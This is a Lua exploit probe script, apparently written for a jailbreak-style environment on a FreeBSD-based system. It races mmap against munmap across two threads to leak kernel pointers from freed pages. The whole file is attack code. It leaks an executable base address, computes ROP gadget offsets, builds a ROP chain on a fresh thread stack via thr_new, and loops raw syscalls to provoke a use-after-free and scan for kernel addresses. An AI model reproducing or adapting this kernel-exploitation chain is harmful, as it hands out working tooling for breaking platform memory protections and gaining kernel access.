-- CRASH_CLASS: MODERATE
-- PROBE 98a: mmap/munmap race between two threads
--
-- Two threads race: thread A mmaps a page, thread B munmaps same VA.
-- If the VM system has a TOCTOU between PTE install and reference counting,
-- thread A could access freed physical pages. We look for:
-- 1. Kernel pointers in recycled pages
-- 2. SIGBUS/SIGSEGV from accessing unmapped memory (normal, expected)
-- 3. Anomalous return values from mmap

print("=== PROBE 98a: MMAP/MUNMAP RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_rdi_rax = eb + 0x92C67  -- mov [rdi], rax; ret

-- Ignore SIGSYS, install SIGALRM handler
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
wq(N(sa), g_bare_ret); wd(N(sa)+8, 0); wq(N(sa)+16, uint64(0))
pcall(function() mk(416)(uint64(14), sa, uint64(0)) end)

local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Spawn child that loops munmap(addr, size) many times then exits
local function spawn_unmapper(target_addr, sz, loops)
    local stk = memory.alloc(0x10000)
    local sb = N(stk)
    local ss = 0x8000
    local rsp = sb + ss - ((sb + ss) % 16) - 8

    local tcb = memory.alloc(0x1000)
    wq(N(tcb), uint64(N(tcb)))
    local fsb = memory.alloc(8)
    wq(N(fsb), uint64(N(tcb)))

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    -- sysarch SET_FSBASE
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fsb)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)

    -- Loop: munmap(addr, sz) many times
    -- munmap is syscall 73: munmap(void *addr, size_t len)
    for i = 1, loops do
        emit(g_pop_rdi); emit(target_addr)
        emit(g_pop_rsi); emit(uint64(sz))
        emit(g_pop_rax); emit(uint64(73))
        emit(stub)
    end

    -- thr_exit
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa+i, 0) end
    wq(pa, g_bare_ret)
    wq(pa+8, uint64(0))
    wq(pa+0x10, uint64(sb))
    wq(pa+0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa+0x30, tid)

    local ok_t, rv_t = pcall(function()
        return mk(455)(uint64(pa), uint64(0x38))
    end)
    return ok_t and N(rv_t) == 0
end

-- ====== TEST: mmap/munmap race ======
-- Strategy: allocate a fixed VA via shm mmap, spawn child to munmap it
-- repeatedly, while main thread remaps and reads
print("--- mmap/munmap race ---")

local total_kptrs = 0
local total_reads = 0
local total_faults = 0

for round = 1, 5 do
    -- Create shm backing
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(2), uint64(0x1FF))
    end)
    local shm_fd = ok_s and N(rv_s) or -1
    if shm_fd >= 0x80000000 then shm_fd = shm_fd - 0x100000000 end
    if shm_fd < 0 then print("R" .. round .. ": shm_open failed"); break end

    local sz = 0x4000  -- 1 page (16KB)
    pcall(function() mk(480)(uint64(shm_fd), uint64(sz)) end)

    -- Initial mmap to get a VA
    local ok_m, rv_m = pcall(function()
        return mk(477)(uint64(0), uint64(sz), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
    end)
    local base_va = ok_m and rv_m or nil
    if not base_va then
        pcall(function() mk(6)(uint64(shm_fd)) end)
        print("R" .. round .. ": mmap failed")
        break
    end

    -- Write marker
    pcall(function() memory.write_dword(base_va, 0xBEEFCAFE) end)

    -- Spawn child that munmaps this VA 20 times
    spawn_unmapper(base_va, sz, 20)

    -- Main thread: remap and read in a tight loop
    local kp = 0
    local reads = 0
    local faults = 0
    for scan = 1, 200 do
        -- Try to read current mapping
        local ok_r, val = pcall(function()
            return memory.read_dword(base_va)
        end)
        if ok_r then
            local v = N(val)
            if v < 0 then v = v + 0x100000000 end
            reads = reads + 1
            if v ~= 0xBEEFCAFE and v ~= 0 then
                local hi4 = math.floor(v / 0x10000000)
                if hi4 >= 0xF and v ~= 0xFFFFFFFF then
                    print(string.format("  R%d.%d KPTR: 0x%08X", round, scan, v))
                    kp = kp + 1
                end
            end
        else
            faults = faults + 1
        end

        -- Try to remap (MAP_FIXED to same VA)
        pcall(function()
            mk(477)(base_va, uint64(sz), uint64(3), uint64(0x1012), uint64(shm_fd), uint64(0))
        end)
    end

    total_kptrs = total_kptrs + kp
    total_reads = total_reads + reads
    total_faults = total_faults + faults

    print(string.format("R%d: reads=%d faults=%d kptrs=%d", round, reads, faults, kp))

    -- Cleanup
    pcall(function() mk(73)(base_va, uint64(sz)) end)
    pcall(function() mk(6)(uint64(shm_fd)) end)

    if not alive() then print("DEAD at R" .. round); break end
end

print(string.format("TOTAL: reads=%d faults=%d kptrs=%d", total_reads, total_faults, total_kptrs))
print("")
print("alive=" .. tostring(alive()))
print("=== 98a COMPLETE ===")
